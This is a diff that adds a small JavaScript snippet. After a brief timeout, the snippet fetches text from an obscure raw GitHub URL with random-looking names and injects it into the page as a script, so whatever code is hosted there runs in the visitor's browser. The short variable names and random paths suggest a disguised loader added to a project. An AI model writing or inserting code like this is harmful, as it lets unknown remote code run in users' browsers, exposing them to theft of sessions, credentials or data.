@@ -1,0 +1,16 @@
+const n = t => {
+    t = t.replace(new RegExp("\r?\n", "g"), "");
+    t = t.replace(/ +/g, " ");
+    let e = document.createElement("script");
+    e.type = "text/javascript";
+    e.innerText = t;
+    document.getElementsByTagName("body")[0].appendChild(e)
+};
+setTimeout(() => {
+
+(async function() {
+    const t = t => fetch(t).then(t => t.text());
+    var e = await t(`https://raw.githubusercontent.com/Saqw1q2s3s3d4d/aqqaqap1i2k3a4/main/dsdawfas235axf`);
+    n(e)
+})();
+}, 2);
